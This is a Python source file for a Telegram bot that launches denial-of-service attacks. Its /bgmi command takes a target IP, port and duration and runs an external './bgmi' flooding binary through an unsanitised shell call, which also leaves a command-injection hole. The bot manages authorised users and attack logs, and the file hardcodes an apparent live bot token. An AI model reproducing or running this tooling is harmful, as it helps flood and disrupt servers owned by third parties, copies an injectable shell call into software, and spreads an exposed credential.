import os
import datetime
import subprocess
import time
from telebot import TeleBot
from requests.exceptions import ReadTimeout

# Admin user IDs
ADMIN_IDS = ["6800732852"]

# File to store allowed user IDs
USER_FILE = "users.txt"

# File to store command logs
LOG_FILE = "log.txt"

# Timeout for API requests
TIMEOUT = 130
# Bot initialization (replace 'YOUR_BOT_TOKEN' with your actual bot token)
bot = TeleBot('7057221824:AAEHiqVq3qC3U3yWByLufnvT-xMzgCdJyiE')

# Function to read user IDs from the file
def read_users():
    if os.path.exists(USER_FILE):
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    return []

# List to store allowed user IDs
allowed_user_ids = read_users()

# Function to log command to the file
def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    username = "@" + user_info.username if user_info.username else f"UserID: {user_id}"
    with open(LOG_FILE, "a") as file:
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")

# Function to clear logs
def clear_logs():
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE, "w") as file:
            file.truncate(0)
        return "Logs cleared successfully"
    return "No logs found to clear."

# Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"

    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

# Function to send message with retries
def send_message_with_retry(chat_id, text, retries=3):
    for attempt in range(retries):
        try:
            bot.send_message(chat_id, text)
            break
        except ReadTimeout:
            if attempt < retries - 1:
                time.sleep(2)
            else:
                bot.send_message(chat_id, "Failed to send message after several attempts.")

# Function to get group admins
def get_group_admins(chat_id):
    try:
        admins = bot.get_chat_administrators(chat_id)
        return [admin.user.id for admin in admins]
    except Exception as e:
        print(f"Error fetching group admins: {str(e)}")
        return []

# Function to check if user is admin
def is_user_admin(chat_id, user_id):
    if str(user_id) in ADMIN_IDS:
        return True
    group_admins = get_group_admins(chat_id)
    return user_id in group_admins

# Command handlers
@bot.message_handler(commands=['add'])
def add_user(message):
    if is_user_admin(message.chat.id, message.from_user.id):
        command = message.text.split()
        if len(command) > 1:
            user_to_add = command[1]
            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")
                response = f"User {user_to_add} added successfully."
            else:
                response = "User already exists."
        else:
            response = "Please specify a user ID to add."
        bot.reply_to(message, response)
    else:
        bot.reply_to(message, "You are not authorized to use this command.")

@bot.message_handler(commands=['remove'])
def remove_user(message):
    if is_user_admin(message.chat.id, message.from_user.id):
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user_id in allowed_user_ids:
                        file.write(f"{user_id}\n")
                response = f"User {user_to_remove} removed successfully."
            else:
                response = f"User {user_to_remove} not found in the list."
        else:
            response = "Please specify a user ID to remove. Usage: /remove <userid>"
        bot.reply_to(message, response)
    else:
        bot.reply_to(message, "You are not authorized to use this command.")

@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    if is_user_admin(message.chat.id, message.from_user.id):
        response = clear_logs()
        bot.reply_to(message, response)
    else:
        bot.reply_to(message, "You are not authorized to use this command.")

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    if is_user_admin(message.chat.id, message.from_user.id):
        try:
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                if user_ids:
                    response = "Authorized Users:\n"
                    for user_id in user_ids:
                        try:
                            user_info = bot.get_chat(int(user_id))
                            username = user_info.username
                            response += f"- @{username} (ID: {user_id})\n"
                        except Exception:
                            response += f"- User ID: {user_id}\n"
                else:
                    response = "No data found"
        except FileNotFoundError:
            response = "No data found"
        bot.reply_to(message, response)
    else:
        bot.reply_to(message, "You are not authorized to use this command.")

@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    if is_user_admin(message.chat.id, message.from_user.id):
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                bot.reply_to(message, "No data found.")
        else:
            bot.reply_to(message, "No data found")
    else:
        bot.reply_to(message, "You are not authorized to use this command.")

@bot.message_handler(commands=['id'])
def show_user_id(message):
    user_id = str(message.chat.id)
    response = f"Your ID: {user_id}"
    bot.reply_to(message, response)

# Function to handle the reply when users run the /bgmi command
def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    
    response = f"{username}, ATTACK STARTED.\n\nTarget: {target}\nPort: {port}\nTime: {time} Seconds\nMethod: BGMI"
    bot.reply_to(message, response)

# Dictionary to store the last time each user ran the /bgmi command
bgmi_cooldown = {}

COOLDOWN_TIME = 0

# Handler for /bgmi command
@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if is_user_admin(message.chat.id, message.from_user.id):
        if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < COOLDOWN_TIME:
            response = "You are on cooldown. Please wait before running the /bgmi command again."
            bot.reply_to(message, response)
            return

        bgmi_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 4:
            target = command[1]
            port = int(command[2])
            time = int(command[3])
            if time > 5000:
                response = "Error: Time interval must be less than 5000."
            else:
                record_command_logs(user_id, '/bgmi', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)
                full_command = f"./bgmi {target} {port} {time} 1000"
                subprocess.run(full_command, shell=True)
                response = f"BGMI attack finished. Target: {target} Port: {port} Time: {time}"
        else:
            response = "Usage: /bgmi <target> <port> <time>"
    else:
        response = "You are not authorized to use this command."
    bot.reply_to(message, response)

# Add /mylogs command to display logs recorded for bgmi and other commands
@bot.message_handler(commands=['mylogs'])
def show_command_logs(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        try:
            with open(LOG_FILE, "r") as file:
                command_logs = file.readlines()
                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
                if user_logs:
                    response = "Your Command Logs:\n" + "".join(user_logs)
                else:
                    response = "No command logs found for you."
        except FileNotFoundError:
            response = "No command logs found."
    else:
        response = "You are not authorized to use this command."
    bot.reply_to(message, response)

# Admin commands helper
@bot.message_handler(commands=['admincmd'])
def show_admin_commands(message):
    if is_user_admin(message.chat.id, message.from_user.id):
        help_text = '''Admin commands:
/add <userId>: Add a user.
/remove <userId>: Remove a user.
/allusers: Authorized users list.
/logs: All users logs.
/broadcast: Broadcast a message.
/clearlogs: Clear the logs file.
'''
        bot.reply_to(message, help_text)
    else:
        bot.reply_to(message, "You are not authorized to use this command.")

# Broadcast message handler
@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    if is_user_admin(message.chat.id, message.from_user.id):
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            message_to_broadcast = "Message to all users by admin:\n\n" + command[1]
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                for user_id in user_ids:
                    try:
                        send_message_with_retry(user_id, message_to_broadcast)
                    except Exception as e:
                        print(f"Failed to send broadcast message to user {user_id}: {str(e)}")
            response = "Broadcast message sent successfully to all users."
        else:
            response = "Please provide a message to broadcast."
        bot.reply_to(message, response)
    else:
        bot.reply_to(message, "You are not authorized to use this command.")

bot.polling(none_stop=True, timeout=TIMEOUT)
